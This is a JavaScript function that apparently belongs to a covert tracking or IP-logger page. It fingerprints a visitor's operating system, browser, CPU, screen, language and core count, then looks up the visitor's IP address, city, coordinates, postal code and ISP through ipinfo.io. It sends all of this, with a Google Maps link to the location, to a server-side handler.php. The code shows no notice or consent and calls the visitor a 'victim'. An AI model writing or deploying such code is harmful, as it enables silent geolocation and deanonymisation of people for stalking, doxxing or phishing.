function mydata() {
    var client = new ClientJS(); // Create A New Client Object

    var OS = client.getOS(); // Get OS Version
    var ver = client.getOSVersion(); // Get OS Version
    var getbrow = client.getBrowser(); // Get Browser
    var getbrowVer = client.getBrowserVersion(); // Get Browser Version
    var CPU = client.getCPU(); // Get CPU Architecture
    var currentResolution = client.getCurrentResolution(); // Get Current Resolution

    var timeZone = '';
    try {
        timeZone = client.getTimeZone(); // Get Time Zone
    } catch {
        timeZone = 'Not Found';
    }
    timeZone = timeZone.toString();

    var language = client.getLanguage(); // Get User Language
    var core = navigator.hardwareConcurrency;
    var check_brave = navigator.brave;

    if (check_brave == undefined) {
        $.get("https://ipinfo.io/json", function(data) {
            var ip = data.ip;
            var city = data.city;
            var region = data.region;
            var country = data.country;
            var loc = data.loc;
            var org = data.org;
            var postal = data.postal;
            var timezone = data.timezone;

            // Split location into latitude and longitude
            var locArray = loc.split(',');
            var latitude = locArray[0];
            var longitude = locArray[1];

            $.ajax({
                type: 'POST',
                url: 'handler.php',
                data: {
                    "data": `IP: ${ip}
OS Name: ${OS}
Version: ${ver}
Browser Name: ${getbrow}
Browser Version: ${getbrowVer}
CPU Name: ${CPU}
Resolution: ${currentResolution}
Time Zone: ${timeZone}
Language: ${language}
Number of CPU Cores: ${core}
City: ${city}
Region: ${region}
Country: ${country}
Location: ${loc} (Latitude: ${latitude}, Longitude: ${longitude})
Organization: ${org}
Postal Code: ${postal}
Timezone: ${timezone}
-------------------------
Google Map Link: https://google.com/maps/place/${latitude}+${longitude}
-------------------------`
                },
                mimeType: 'text'
            });
        });
    } else {
        $.ajax({
            type: 'POST',
            url: 'handler.php',
            data: {
                "data": `IP: I could not find. Because the browser is a victim of Brave
OS Name: ${OS}
Version: ${ver}
Browser Name: ${getbrow}
Browser Version: ${getbrowVer}
CPU Name: ${CPU}
Resolution: ${currentResolution}
Time Zone: ${timeZone}
Language: ${language}
Number of CPU Cores: ${core}`
            },
            mimeType: 'text'
        });
    }
}
